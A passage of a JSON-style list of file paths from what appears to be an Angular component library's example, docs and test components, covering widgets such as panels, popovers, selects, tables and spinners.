"paginator/paginator-virtual-scroll/paginator-virtual-scroll.example.component.html",\n    "paginator/paginator-virtual-scroll/paginator-virtual-scroll.example.component.ts",\n    "paginator/paginator-visibility/paginator-visibility.example.component.html",\n    "paginator/paginator-visibility/paginator-visibility.example.component.ts",\n    "paginator/paginator-visual-test/paginator-visual-test.component.html",\n    "paginator/paginator-visual-test/paginator-visual-test.component.ts",\n    "paginator/paginator.module.ts",\n    "panel/index.ts",\n    "panel/panel-basic/panel-basic.example.component.html",\n    "panel/panel-basic/panel-basic.example.component.ts",\n    "panel/panel-collapse/panel-collapse.example.component.html",\n    "panel/panel-collapse/panel-collapse.example.component.ts",\n    "panel/panel-collapse-outside-control/panel-collapse-outside-control.example.component.html",\n    "panel/panel-collapse-outside-control/panel-collapse-outside-control.example.component.ts",\n    "panel/panel-collapse-top-oriented/panel-collapse-top-oriented.example.component.html",\n    "panel/panel-collapse-top-oriented/panel-collapse-top-oriented.example.component.ts",\n    "panel/panel-custom-styles/panel-custom-styles.example.component.html",\n    "panel/panel-custom-styles/panel-\u0441ustom-styles.example.component.ts",\n    "panel/panel-docs/panel-docs.example.component.html",\n    "panel/panel-docs/panel-docs.example.component.ts",\n    "panel/panel-embedded-content/panel-embedded-content.example.component.html",\n    "panel/panel-embedded-content/panel-embedded-content.example.component.ts",\n    "panel/panel-float/panel-float.example.component.html",\n    "panel/panel-float/panel-float.example.component.ts",\n    "panel/panel-hide/panel-hide.example.component.html",\n    "panel/panel-hide/panel-hide.example.component.ts",\n    "panel/panel-hide-outside-control/panel-hide-outside-control.example.component.html",\n    "panel/panel-hide-outside-control/panel-hide-outside-control.example.component.ts",\n    "panel/panel-hoverable/panel-hoverable.example.component.html",\n    "panel/panel-hoverable/panel-hoverable.example.component.ts",\n    "panel/panel-nested/panel-nested.example.component.html",\n    "panel/panel-nested/panel-nested.example.component.ts",\n    "panel/panel-position/panel-position.example.component.html",\n    "panel/panel-position/panel-position.example.component.ts",\n    "panel/panel-resize/panel-resize.example.component.html",\n    "panel/panel-resize/panel-resize.example.component.ts",\n    "panel/panel-size/panel-size.example.component.html",\n    "panel/panel-size/panel-size.example.component.ts",\n    "panel/panel-test/panel-test.component.html",\n    "panel/panel-test/panel-test.component.ts",\n    "panel/panel-visual-test/panel-visual-test.component.html",\n    "panel/panel-visual-test/panel-visual-test.component.ts",\n    "panel/panel.module.ts",\n    "pipes/highlight/highlight-pipe/highlight-pipe.example.component.html",\n    "pipes/highlight/highlight-pipe/highlight-pipe.example.component.ts",\n    "pipes/highlight/highlight-pipe-docs/highlight-pipe-docs.example.component.html",\n    "pipes/highlight/highlight-pipe-docs/highlight-pipe-docs.example.component.ts",\n    "pipes/highlight/highlight-pipe-example.module.ts",\n    "pipes/pipes.module.ts",\n    "pipes/unit-conversion/docs/unit-conversion-pipe-docs.component.html",\n    "pipes/unit-conversion/docs/unit-conversion-pipe-docs.component.less",\n    "pipes/unit-conversion/docs/unit-conversion-pipe-docs.component.ts",\n    "pipes/unit-conversion/unit-conversion-basic/unit-conversion-pipe-basic.example.component.html",\n    "pipes/unit-conversion/unit-conversion-basic/unit-conversion-pipe-basic.example.component.less",\n    "pipes/unit-conversion/unit-conversion-basic/unit-conversion-pipe-basic.example.component.ts",\n    "pipes/unit-conversion/unit-conversion-pipe-example.module.ts",\n    "popover/index.ts",\n    "popover/popover-basic-usage/popover-basic-usage.example.component.html",\n    "popover/popover-basic-usage/popover-basic-usage.example.component.ts",\n    "popover/popover-click-trigger/popover-click-trigger.example.component.html",\n    "popover/popover-click-trigger/popover-click-trigger.example.component.ts",\n    "popover/popover-debounce/popover-debounce.example.component.html",\n    "popover/popover-debounce/popover-debounce.example.component.ts",\n    "popover/popover-disabled/popover-disabled.example.component.html",\n    "popover/popover-disabled/popover-disabled.example.component.ts",\n    "popover/popover-docs/popover-docs.example.component.html",\n    "popover/popover-docs/popover-docs.example.component.ts",\n    "popover/popover-focus-trigger/popover-focus-trigger.example.component.html",\n    "popover/popover-focus-trigger/popover-focus-trigger.example.component.ts",\n    "popover/popover-icon/popover-icon.example.component.html",\n    "popover/popover-icon/popover-icon.example.component.less",\n    "popover/popover-icon/popover-icon.example.component.ts",\n    "popover/popover-modal/popover-modal.example.component.html",\n    "popover/popover-modal/popover-modal.example.component.ts",\n    "popover/popover-mouseenter-trigger/popover-mouseenter-trigger.example.component.html",\n    "popover/popover-mouseenter-trigger/popover-mouseenter-trigger.example.component.ts",\n    "popover/popover-no-padding/popover-no-padding.example.component.html",\n    "popover/popover-no-padding/popover-no-padding.example.component.ts",\n    "popover/popover-open-and-close-programmatically/popover-open-and-close-programmatically.example.component.html",\n    "popover/popover-open-and-close-programmatically/popover-open-and-close-programmatically.example.component.ts",\n    "popover/popover-outputs/popover-outputs.example.component.html",\n    "popover/popover-outputs/popover-outputs.example.component.ts",\n    "popover/popover-placement/popover-placement.example.component.html",\n    "popover/popover-placement/popover-placement.example.component.ts",\n    "popover/popover-prevent-close-on-click/popover-prevent-close-on-click.example.component.html",\n    "popover/popover-prevent-close-on-click/popover-prevent-close-on-click.example.component.ts",\n    "popover/popover-status/popover-status.example.component.html",\n    "popover/popover-status/popover-status.example.component.less",\n    "popover/popover-status/popover-status.example.component.ts",\n    "popover/popover-unlimited/popover-unlimited.example.component.html",\n    "popover/popover-unlimited/popover-unlimited.example.component.ts",\n    "popover/popover-visual-test/popover-visual-test.component.html",\n    "popover/popover-visual-test/popover-visual-test.component.less",\n    "popover/popover-visual-test/popover-visual-test.component.ts",\n    "popover/popover-with-container/popover-with-container.example.component.html",\n    "popover/popover-with-container/popover-with-container.example.component.ts",\n    "popover/popover-with-title/popover-with-title.example.component.html",\n    "popover/popover-with-title/popover-with-title.example.component.ts",\n    "popover/popover.module.ts",\n    "popover/styles.less",\n    "popup/index.ts",\n    "popup/popup-append-to-body/popup-append-to-body.example.component.html",\n    "popup/popup-append-to-body/popup-append-to-body.example.component.ts",\n    "popup/popup-different-directions/popup-different-directions.example.component.html",\n    "popup/popup-different-directions/popup-different-directions.example.component.ts",\n    "popup/popup-docs/popup-docs.example.component.html",\n    "popup/popup-docs/popup-docs.example.component.ts",\n    "popup/popup-simple-usage/popup-simple-usage.example.component.html",\n    "popup/popup-simple-usage/popup-simple-usage.example.component.ts",\n    "popup/popup-test/popup-test.example.component.html",\n    "popup/popup-test/popup-test.example.component.less",\n    "popup/popup-test/popup-test.example.component.ts",\n    "popup/popup-with-custom-content/popup-with-custom-content.example.component.html",\n    "popup/popup-with-custom-content/popup-with-custom-content.example.component.less",\n    "popup/popup-with-custom-content/popup-with-custom-content.example.component.ts",\n    "popup/popup-with-custom-styling/popup-with-custom-styling.example.component.html",\n    "popup/popup-with-custom-styling/popup-with-custom-styling.example.component.less",\n    "popup/popup-with-custom-styling/popup-with-custom-styling.example.component.ts",\n    "popup/popup-with-custom-width/popup-with-custom-width.example.component.html",\n    "popup/popup-with-custom-width/popup-with-custom-width.example.component.ts",\n    "popup/popup.module.ts",\n    "progress/basic-progress/basic-progress.example.component.html",\n    "progress/basic-progress/basic-progress.example.component.ts",\n    "progress/indeterminate-progress/indeterminate-progress.example.component.html",\n    "progress/indeterminate-progress/indeterminate-progress.example.component.ts",\n    "progress/index.ts",\n    "progress/progress-compact/progress-compact.example.component.html",\n    "progress/progress-compact/progress-compact.example.component.ts",\n    "progress/progress-docs/progress-docs.example.component.html",\n    "progress/progress-docs/progress-docs.example.component.ts",\n    "progress/progress-test/progress-test.component.html",\n    "progress/progress-test/progress-test.component.ts",\n    "progress/progress-visual-test/progress-visual-test.component.html",\n    "progress/progress-visual-test/progress-visual-test.component.ts",\n    "progress/progress-with-help-template/progress-with-help-template-example.component.html",\n    "progress/progress-with-help-template/progress-with-help-template-example.component.ts",\n    "progress/progress.module.ts",\n    "progress/stacked-header/stacked-header.example.component.html",\n    "progress/stacked-header/stacked-header.example.component.ts",\n    "radio-group/basic-radio-group/basic-radio-group.example.component.html",\n    "radio-group/basic-radio-group/basic-radio-group.example.component.ts",\n    "radio-group/disabled-radio-group/disabled-radio-group.example.component.html",\n    "radio-group/disabled-radio-group/disabled-radio-group.example.component.ts",\n    "radio-group/index.ts",\n    "radio-group/radio-group-docs/radio-group-docs.example.component.html",\n    "radio-group/radio-group-docs/radio-group-docs.example.component.ts",\n    "radio-group/radio-group-in-form/radio-group-in-form.example.component.html",\n    "radio-group/radio-group-in-form/radio-group-in-form.example.component.ts",\n    "radio-group/radio-group-inline/radio-group-inline.example.component.html",\n    "radio-group/radio-group-inline/radio-group-inline.example.component.ts",\n    "radio-group/radio-group-test/radio-group-test.component.html",\n    "radio-group/radio-group-test/radio-group-test.component.ts",\n    "radio-group/radio-group-visual-test/radio-group-visual-test.component.html",\n    "radio-group/radio-group-visual-test/radio-group-visual-test.component.ts",\n    "radio-group/radio-group-with-hints/radio-group-hints.example.component.html",\n    "radio-group/radio-group-with-hints/radio-group-hints.example.component.ts",\n    "radio-group/radio-group-with-hints-content/radio-group-hints-content.example.component.html",\n    "radio-group/radio-group-with-hints-content/radio-group-hints-content.example.component.ts",\n    "radio-group/radio-group.module.ts",\n    "radio-group/value-change-radio-group/value-change-radio-group.example.component.html",\n    "radio-group/value-change-radio-group/value-change-radio-group.example.component.ts",\n    "repeat/index.ts",\n    "repeat/repeat-disabled-multi-selection/repeat-disabled-multi-selection.example.component.html",\n    "repeat/repeat-disabled-multi-selection/repeat-disabled-multi-selection.example.component.ts",\n    "repeat/repeat-docs/repeat-docs.example.component.html",\n    "repeat/repeat-docs/repeat-docs.example.component.ts",\n    "repeat/repeat-drag-handle/repeat-drag-handle.example.component.html",\n    "repeat/repeat-drag-handle/repeat-drag-handle.example.component.ts",\n    "repeat/repeat-drag-preview/repeat-drag-preview.example.component.html",\n    "repeat/repeat-drag-preview/repeat-drag-preview.example.component.less",\n    "repeat/repeat-drag-preview/repeat-drag-preview.example.component.ts",\n    "repeat/repeat-drag-simple/repeat-drag-simple.example.component.html",\n    "repeat/repeat-drag-simple/repeat-drag-simple.example.component.ts",\n    "repeat/repeat-item/repeat-item.example.component.html",\n    "repeat/repeat-item/repeat-item.example.component.ts",\n    "repeat/repeat-multi-selection/repeat-multi-selection.example.component.html",\n    "repeat/repeat-multi-selection/repeat-multi-selection.example.component.ts",\n    "repeat/repeat-radio-selection-mode/repeat-radio-selection-mode.example.component.html",\n    "repeat/repeat-radio-selection-mode/repeat-radio-selection-mode.example.component.ts",\n    "repeat/repeat-radio-with-non-required-selection-mode/repeat-radio-with-non-required-selection-mode.example.component.html",\n    "repeat/repeat-radio-with-non-required-selection-mode/repeat-radio-with-non-required-selection-mode.example.component.ts",\n    "repeat/repeat-reorder-item-config/repeat-reorder-item-config-example.component.html",\n    "repeat/repeat-reorder-item-config/repeat-reorder-item-config-example.component.ts",\n    "repeat/repeat-reorder-simple/repeat-reorder-simple-example.component.html",\n    "repeat/repeat-reorder-simple/repeat-reorder-simple-example.component.ts",\n    "repeat/repeat-simple/repeat-simple.example.component.html",\n    "repeat/repeat-simple/repeat-simple.example.component.ts",\n    "repeat/repeat-single-selection-mode/repeat-single-selection-mode.example.component.html",\n    "repeat/repeat-single-selection-mode/repeat-single-selection-mode.example.component.ts",\n    "repeat/repeat-single-selection-mode/repeat-single-selection-mode.example.less",\n    "repeat/repeat-single-with-required-selection-mode/repeat-single-with-required-selection-mode.example.component.html",\n    "repeat/repeat-single-with-required-selection-mode/repeat-single-with-required-selection-mode.example.component.ts",\n    "repeat/repeat-test/repeat-test.component.html",\n    "repeat/repeat-test/repeat-test.component.ts",\n    "repeat/repeat-virtual-scroll/repeat-virtual-scroll-data-source.ts",\n    "repeat/repeat-virtual-scroll/repeat-virtual-scroll-data.ts",\n    "repeat/repeat-virtual-scroll/repeat-virtual-scroll.component.html",\n    "repeat/repeat-virtual-scroll/repeat-virtual-scroll.component.less",\n    "repeat/repeat-virtual-scroll/repeat-virtual-scroll.component.ts",\n    "repeat/repeat-virtual-scroll/types.ts",\n    "repeat/repeat-visual-test/repeat-visual-test.component.html",\n    "repeat/repeat-visual-test/repeat-visual-test.component.ts",\n    "repeat/repeat.module.ts",\n    "resize/index.ts",\n    "resize/resize-basic/resize-basic.example.component.html",\n    "resize/resize-basic/resize-basic.example.component.ts",\n    "resize/resize-docs/resize-docs.example.component.html",\n    "resize/resize-docs/resize-docs.example.component.ts",\n    "resize/resize-nested/resize-nested.example.component.html",\n    "resize/resize-nested/resize-nested.example.component.ts",\n    "resize/resize-percents/resize-percents.example.component.html",\n    "resize/resize-percents/resize-percents.example.component.ts",\n    "resize/resize-visual-test/resize-visual-test.component.html",\n    "resize/resize-visual-test/resize-visual-test.component.ts",\n    "resize/resize.module.ts",\n    "risk-score/index.ts",\n    "risk-score/risk-score-basic/risk-score-basic.example.component.html",\n    "risk-score/risk-score-basic/risk-score-basic.example.component.ts",\n    "risk-score/risk-score-docs/risk-score-docs.example.component.html",\n    "risk-score/risk-score-docs/risk-score-docs.example.component.ts",\n    "risk-score/risk-score.module.ts",\n    "runtime-i18n/runtime-i18n-example.component.html",\n    "runtime-i18n/runtime-i18n-example.component.ts",\n    "runtime-i18n/runtime-i18n.module.ts",\n    "search/index.ts",\n    "search/search-basic/search-basic.example.component.html",\n    "search/search-basic/search-basic.example.component.ts",\n    "search/search-docs/search-docs.example.component.html",\n    "search/search-docs/search-docs.example.component.ts",\n    "search/search-error-state/search-error-state.example.component.html",\n    "search/search-error-state/search-error-state.example.component.ts",\n    "search/search-focus-change/search-focus-change.example.component.html",\n    "search/search-focus-change/search-focus-change.example.component.ts",\n    "search/search-input-change/search-input-change.example.component.html",\n    "search/search-input-change/search-input-change.example.component.ts",\n    "search/search-on-search-cancel/search-on-search-cancel.example.component.html",\n    "search/search-on-search-cancel/search-on-search-cancel.example.component.ts",\n    "search/search-placeholder/search-placeholder.example.component.html",\n    "search/search-placeholder/search-placeholder.example.component.ts",\n    "search/search-test/search-test.example.component.html",\n    "search/search-test/search-test.example.component.ts",\n    "search/search-visual-test/search-visual-test.component.html",\n    "search/search-visual-test/search-visual-test.component.ts",\n    "search/search.module.ts",\n    "select/index.ts",\n    "select/select-basic/select-basic.example.component.html",\n    "select/select-basic/select-basic.example.component.ts",\n    "select/select-custom-template/select-custom-template.example.component.html",\n    "select/select-custom-template/select-custom-template.example.component.less",\n    "select/select-custom-template/select-custom-template.example.component.ts",\n    "select/select-disabled/select-disabled.example.component.html",\n    "select/select-disabled/select-disabled.example.component.ts",\n    "select/select-docs/select-docs.example.component.html",\n    "select/select-docs/select-docs.example.component.ts",\n    "select/select-inline/select-inline.example.component.html",\n    "select/select-inline/select-inline.example.component.ts",\n    "select/select-justified/select-justified.example.component.html",\n    "select/select-justified/select-justified.example.component.ts",\n    "select/select-reactive-form/select-reactive-form.example.component.html",\n    "select/select-reactive-form/select-reactive-form.example.component.ts",\n    "select/select-remove-value/select-remove-value.example.component.html",\n    "select/select-remove-value/select-remove-value.example.component.ts",\n    "select/select-required/select-required.example.component.html",\n    "select/select-required/select-required.example.component.ts",\n    "select/select-separators/select-separators.example.component.html",\n    "select/select-separators/select-separators.example.component.ts",\n    "select/select-visual-test/select-visual-test.component.html",\n    "select/select-visual-test/select-visual-test.component.ts",\n    "select/select.module.ts",\n    "select-v2/index.ts",\n    "select-v2/select-v2-basic/select-v2-basic.example.component.html",\n    "select-v2/select-v2-basic/select-v2-basic.example.component.ts",\n    "select-v2/select-v2-color-picker/select-v2-color-picker.component.html",\n    "select-v2/select-v2-color-picker/select-v2-color-picker.component.less",\n    "select-v2/select-v2-color-picker/select-v2-color-picker.component.ts",\n    "select-v2/select-v2-custom-content/select-v2-custom-content.example.component.html",\n    "select-v2/select-v2-custom-content/select-v2-custom-content.example.component.less",\n    "select-v2/select-v2-custom-content/select-v2-custom-content.example.component.ts",\n    "select-v2/select-v2-custom-control/select-v2-custom-control.example.component.html",\n    "select-v2/select-v2-custom-control/select-v2-custom-control.example.component.ts",\n    "select-v2/select-v2-customize-options/select-v2-customize-options.example.component.html",\n    "select-v2/select-v2-customize-options/select-v2-customize-options.example.component.ts",\n    "select-v2/select-v2-disabled/select-v2-disabled.example.component.html",\n    "select-v2/select-v2-disabled/select-v2-disabled.example.component.ts",\n    "select-v2/select-v2-docs/select-v2-docs.example.component.html",\n    "select-v2/select-v2-docs/select-v2-docs.example.component.less",\n    "select-v2/select-v2-docs/select-v2-docs.example.component.ts",\n    "select-v2/select-v2-error/select-v2-error.example.component.html",\n    "select-v2/select-v2-error/select-v2-error.example.component.ts",\n    "select-v2/select-v2-getting-value/select-v2-getting-value.example.component.html",\n    "select-v2/select-v2-getting-value/select-v2-getting-value.example.component.ts",\n    "select-v2/select-v2-grouped-items/select-v2-grouped-items.example.component.html",\n    "select-v2/select-v2-grouped-items/select-v2-grouped-items.example.component.ts",\n    "select-v2/select-v2-inline/select-v2-inline.example.component.html",\n    "select-v2/select-v2-inline/select-v2-inline.example.component.ts",\n    "select-v2/select-v2-options-changed/select-v2-options-changed.example.component.html",\n    "select-v2/select-v2-options-changed/select-v2-options-changed.example.component.ts",\n    "select-v2/select-v2-overlay-config/select-v2-overlay-config.example.component.html",\n    "select-v2/select-v2-overlay-config/select-v2-overlay-config.example.component.ts",\n    "select-v2/select-v2-reactive-form-field/select-v2-reactive-form-field.example.component.html",\n    "select-v2/select-v2-reactive-form-field/select-v2-reactive-form-field.example.component.ts",\n    "select-v2/select-v2-setting-value/select-v2-setting-value.example.component.html",\n    "select-v2/select-v2-setting-value/select-v2-setting-value.example.component.ts",\n    "select-v2/select-v2-styling/select-v2-styling.example.component.html",\n    "select-v2/select-v2-styling/select-v2-styling.example.component.less",\n    "select-v2/select-v2-styling/select-v2-styling.example.component.ts",\n    "select-v2/select-v2-test/select-v2-test.example.component.html",\n    "select-v2/select-v2-test/select-v2-test.example.component.less",\n    "select-v2/select-v2-test/select-v2-test.example.component.ts",\n    "select-v2/select-v2-virtual-scroll/select-v2-virtual-scroll.example.component.html",\n    "select-v2/select-v2-virtual-scroll/select-v2-virtual-scroll.example.component.ts",\n    "select-v2/select-v2.module.ts",\n    "selector/selector.example.component.html",\n    "selector/selector.example.component.ts",\n    "selector/selector.module.ts",\n    "sorter/sorter-basic/sorter-basic.example.component.html",\n    "sorter/sorter-basic/sorter-basic.example.component.less",\n    "sorter/sorter-basic/sorter-basic.example.component.ts",\n    "sorter/sorter-docs/sorter-docs.example.component.html",\n    "sorter/sorter-docs/sorter-docs.example.component.ts",\n    "sorter/sorter-test/sorter-test.example.component.html",\n    "sorter/sorter-test/sorter-test.example.component.less",\n    "sorter/sorter-test/sorter-test.example.component.ts",\n    "sorter/sorter-visual-test/sorter-legacy-string-input-usage/sorter-legacy-string-input-usage-visual-test.component.html",\n    "sorter/sorter-visual-test/sorter-legacy-string-input-usage/sorter-legacy-string-input-usage-visual-test.component.less",\n    "sorter/sorter-visual-test/sorter-legacy-string-input-usage/sorter-legacy-string-input-usage-visual-test.component.ts",\n    "sorter/sorter-visual-test/sorter-recommended-usage/sorter-recommended-usage-visual-test.component.html",\n    "sorter/sorter-visual-test/sorter-recommended-usage/sorter-recommended-usage-visual-test.component.less",\n    "sorter/sorter-visual-test/sorter-recommended-usage/sorter-recommended-usage-visual-test.component.ts",\n    "sorter/sorter-visual-test/sorter-visual-test-harness.component.html",\n    "sorter/sorter-visual-test/sorter-visual-test-harness.component.ts",\n    "sorter/sorter.module.ts",\n    "spinner/index.ts",\n    "spinner/spinner-basic/spinner-basic.example.component.html",\n    "spinner/spinner-basic/spinner-basic.example.component.ts",\n    "spinner/spinner-determinate/spinner-determinate.example.component.html",\n    "spinner/spinner-determinate/spinner-determinate.example.component.ts",\n    "spinner/spinner-docs/spinner-docs.example.component.html",\n    "spinner/spinner-docs/spinner-docs.example.component.ts",\n    "spinner/spinner-sizes/spinner-sizes.example.component.html",\n    "spinner/spinner-sizes/spinner-sizes.example.component.ts",\n    "spinner/spinner-test/spinner-test.html",\n    "spinner/spinner-test/spinner-test.ts",\n    "spinner/spinner-visual-test/spinner-visual-test.component.html",\n    "spinner/spinner-visual-test/spinner-visual-test.component.ts",\n    "spinner/spinner-with-cancel/spinner-with-cancel.example.component.html",\n    "spinner/spinner-with-cancel/spinner-with-cancel.example.component.ts",\n    "spinner/spinner-with-delay-toggle/spinner-with-delay-toggle.example.component.html",\n    "spinner/spinner-with-delay-toggle/spinner-with-delay-toggle.example.component.ts",\n    "spinner/spinner-with-text/spinner-with-text.example.component.html",\n    "spinner/spinner-with-text/spinner-with-text.example.component.ts",\n    "spinner/spinner.module.ts",\n    "switch/index.ts",\n    "switch/switch-disable/switch-disable.example.component.html",\n    "switch/switch-disable/switch-disable.example.component.ts",\n    "switch/switch-docs/switch-docs.example.component.html",\n    "switch/switch-docs/switch-docs.example.component.ts",\n    "switch/switch-simple/switch-simple.example.component.html",\n    "switch/switch-simple/switch-simple.example.component.ts",\n    "switch/switch-test/switch-test.component.html",\n    "switch/switch-test/switch-test.component.ts",\n    "switch/switch-value-change/switch-value-change.example.component.html",\n    "switch/switch-value-change/switch-value-change.example.component.ts",\n    "switch/switch-visual-test/switch-visual-test.component.html",\n    "switch/switch-visual-test/switch-visual-test.component.ts",\n    "switch/switch.module.ts",\n    "tabgroup/index.ts",\n    "tabgroup/tab-heading-group-dynamic/tab-heading-group-dynamic.example.component.html",\n    "tabgroup/tab-heading-group-dynamic/tab-heading-group-dynamic.example.component.less",\n    "tabgroup/tab-heading-group-dynamic/tab-heading-group-dynamic.example.component.ts",\n    "tabgroup/tab-heading-group-horizontal/tab-heading-group-horizontal.example.component.html",\n    "tabgroup/tab-heading-group-horizontal/tab-heading-group-horizontal.example.component.less",\n    "tabgroup/tab-heading-group-horizontal/tab-heading-group-horizontal.example.component.ts",\n    "tabgroup/tab-heading-group-horizontal-with-icons/tab-heading-group-horizontal-with-icons.example.component.html",\n    "tabgroup/tab-heading-group-horizontal-with-icons/tab-heading-group-horizontal-with-icons.example.component.less",\n    "tabgroup/tab-heading-group-horizontal-with-icons/tab-heading-group-horizontal-with-icons.example.component.ts",\n    "tabgroup/tab-heading-group-horizontal-with-icons-only/tab-heading-group-horizontal-with-icons-only.example.component.html",\n    "tabgroup/tab-heading-group-horizontal-with-icons-only/tab-heading-group-horizontal-with-icons-only.example.component.less",\n    "tabgroup/tab-heading-group-horizontal-with-icons-only/tab-heading-group-horizontal-with-icons-only.example.component.ts",\n    "tabgroup/tab-heading-group-responsive/tab-heading-group-responsive.example.component.html",\n    "tabgroup/tab-heading-group-responsive/tab-heading-group-responsive.example.component.ts",\n    "tabgroup/tab-heading-group-test/tab-heading-group-test.component.html",\n    "tabgroup/tab-heading-group-test/tab-heading-group-test.component.ts",\n    "tabgroup/tab-heading-group-vertical/tab-heading-group-vertical.example.component.html",\n    "tabgroup/tab-heading-group-vertical/tab-heading-group-vertical.example.component.ts",\n    "tabgroup/tab-heading-group-vertical-with-icons/tab-heading-group-vertical-with-icons.example.component.html",\n    "tabgroup/tab-heading-group-vertical-with-icons/tab-heading-group-vertical-with-icons.example.component.ts",\n    "tabgroup/tab-heading-group-with-content/tab-heading-group-with-content.example.component.html",\n    "tabgroup/tab-heading-group-with-content/tab-heading-group-with-content.example.component.less",\n    "tabgroup/tab-heading-group-with-content/tab-heading-group-with-content.example.component.ts",\n    "tabgroup/tab-heading-group-with-icons/tab-heading-group-with-icons.example.component.html",\n    "tabgroup/tab-heading-group-with-icons/tab-heading-group-with-icons.example.component.ts",\n    "tabgroup/tab-heading-group-with-router/routes.ts",\n    "tabgroup/tab-heading-group-with-router/tab-content/about/tab-content-about.example.component.html",\n    "tabgroup/tab-heading-group-with-router/tab-content/about/tab-content-about.example.component.ts",\n    "tabgroup/tab-heading-group-with-router/tab-content/settings/tab-content-settings.example.component.html",\n    "tabgroup/tab-heading-group-with-router/tab-content/settings/tab-content-settings.example.component.ts",\n    "tabgroup/tab-heading-group-with-router/tab-content/statistics/tab-content-statistics.example.component.html",\n    "tabgroup/tab-heading-group-with-router/tab-content/statistics/tab-content-statistics.example.component.ts",\n    "tabgroup/tab-heading-group-with-router/tab-heading-group-with-router.example.component.html",\n    "tabgroup/tab-heading-group-with-router/tab-heading-group-with-router.example.component.less",\n    "tabgroup/tab-heading-group-with-router/tab-heading-group-with-router.example.component.ts",\n    "tabgroup/tabgroup-docs/tabgroup-docs.example.component.html",\n    "tabgroup/tabgroup-docs/tabgroup-docs.example.component.ts",\n    "tabgroup/tabgroup.module.ts",\n    "table/index.ts",\n    "table/table-basic/table-basic.example.component.html",\n    "table/table-basic/table-basic.example.component.less",\n    "table/table-basic/table-basic.example.component.ts",\n    "table/table-cell-content-align/table-cell-content-align.example.component.html",\n    "table/table-cell-content-align/table-cell-content-align.example.component.less",\n    "table/table-cell-content-align/table-cell-content-align.example.component.ts",\n    "table/table-cell-width-set/table-cell-width-set.example.component.html",\n    "table/table-cell-width-set/table-cell-width-set.example.component.ts",\n    "table/table-columns-add-remove/table-columns-add-remove.example.component.html",\n    "table/table-columns-add-remove/table-columns-add-remove.example.component.less",\n    "table/table-columns-add-remove/table-columns-add-remove.example.component.ts",\n    "table/table-docs/table-docs.example.component.html",\n    "table/table-docs/table-docs.example.component.ts",\n    "table/table-pagination/table-pagination.example.component.html",\n    "table/table-pagination/table-pagination.example.component.ts",\n    "table/table-pinned-header/table-pinned-header.example.component.html",\n    "table/table-pinned-header/table-pinned-header.example.component.less",\n    "table/table-pinned-header/table-pinned-header.example.component.ts",\n    "table/table-reorder/table-reorder.example.component.html",\n    "table/table-reorder/table-reorder.example.component.less",\n    "table/table-reorder/table-reorder.example.component.ts",\n    "table/table-resize/table-resize.example.component.html",\n    "table/table-resize/table-resize.example.component.ts",\n    "table/table-row-clickable/table-row-clickable.example.component.html",\n    "table/table-row-clickable/table-row-clickable.example.component.ts",\n    "table/table-row-height-set/table-row-height-set.example.component.html",\n    "table/table-row-height-set/table-row-height-set.example.component.less",\n    "table/table-row-height-set/table-row-height-set.example.component.ts",\n    "table/table-search/table-search.example.component.html",\n    "table/table-search/table-search.example.component.less",\n    "table/table-search/table-search.example.component.ts",\n    "table/table-search-with-select-and-pagination/table-search-with-select-and-pagination.example.component.html",\n    "table/table-search-with-select-and-pagination/table-search-with-select-and-pagination.example.component.less",\n    "table/table-search-with-select-and-pagination/table-search-with-select-and-pagination.example.component.ts",\n    "table/table-select/table-select.example.component.html",\n    "table/table-select/table-select.example.component.ts",\n    "table/table-select-pinned-header/table-select-pinned-header.example.component.html",\n    "table/table-select-pinned-header/table-select-pinned-header.example.component.less",\n    "table/table-select-pinned-header/table-select-pinned-header.example.component.ts",\n    "table/table-selectable-toggle/table-selectable-toggle.example.component.html",\n    "table/table-selectable-toggle/table-selectable-toggle.example.component.ts",\n    "table/table-sorting/table-sorting.example.component.html",\n    "table/table-sorting/table-sorting.example.component.ts",\n    "table/table-test/table-test-data-source.ts",\n    "table/table-test/table-test.component.html",\n    "table/table-test/table-test.component.ts",\n    "table/table-virtual-scroll-datasource-1.ts",\n    "table/table-virtual-scroll-datasource.ts",\n    "table/table-virtual-scroll-real-api/table-virtual-scroll-real-api.example.component.html",\n    "table/table-virtual-scroll-real-api/table-virtual-scroll-real-api.example.component.less",\n    "table/table-virtual-scroll-real-api/table-virtual-scroll-real-api.example.component.ts",\n    "table/table-virtual-scroll-real-api-minimalist/table-virtual-scroll-real-api-minimalist.example.component.html",\n    "table/table-virtual-scroll-real-api-minimalist/table-virtual-scroll-real-api-minimalist.example.component.less",\n    "table/table-virtual-scroll-real-api-minimalist/table-virtual-scroll-real-api-minimalist.example.component.ts",\n    "table/table-virtual-scroll-real-api-progress-footer/table-virtual-scroll-real-api-progress-footer.example.component.html",\n    "table/table-virtual-scroll-real-api-progress-footer/table-virtual-scroll-real-api-progress-footer.example.component.less",\n    "table/table-virtual-scroll-real-api-progress-footer/table-virtual-scroll-real-api-progress-footer.example.component.ts",\n    "table/table-virtual-scroll-real-api-progress-text-footer/table-virtual-scroll-real-api-progress-text-footer.example.component.html",\n    "table/table-virtual-scroll-real-api-progress-text-footer/table-virtual-scroll-real-api-progress-text-footer.example.component.less",\n    "table/table-virtual-scroll-real-api-progress-text-footer/table-virtual-scroll-real-api-progress-text-footer.example.component.ts",\n    "table/table-virtual-scroll-select-sticky-header/table-virtual-scroll-select-sticky-header-example.component.html",\n    "table/table-virtual-scroll-select-sticky-header/table-virtual-scroll-select-sticky-header-example.component.ts",\n    "table/table-virtual-scroll-steps-and-button/table-virtual-scroll-steps-and-button.example.component.html",\n    "table/table-virtual-scroll-steps-and-button/table-virtual-scroll-steps-and-button.example.component.less",\n    "table/table-virtual-scroll-steps-and-button/table-virtual-scroll-steps-and-button.example.component.ts",\n    "table/table-virtual-scroll-sticky-header/table-virtual-scroll-sticky-header-example.component.html",\n    "table/table-virtual-scroll-sticky-header/table-virtual-scroll-sticky-header-example.component.ts",\n    "table/table-virtual-scroll-sticky-header-test/table-virtual-scroll-sticky-header-test-example.component.html",\n    "table/table-virtual-scroll-sticky-header-test/table-virtual-scroll-sticky-header-test-example.component.ts",\n    "table/table-visual-test/table-visual-test.example.html",\n    "table/table-visual-test/table-visual-test.example.ts",\n    "table/table.module.ts",\n    "textbox/index.ts",\n    "textbox/textbox-area/textbox-area.example.component.html",\n    "textbox/textbox-area/textbox-area.example.component.ts",\n    "textbox/textbox-basic/textbox-basic.example.component.html",\n    "textbox/textbox-basic/textbox-basic.example.component.ts",\n    "textbox/textbox-custom-width/textbox-custom-width.example.component.html",\n    "textbox/textbox-custom-width/textbox-custom-width.example.component.ts",\n    "textbox/textbox-disabled/textbox-disabled.example.component.html",\n    "textbox/textbox-disabled/textbox-disabled.example.ts",\n    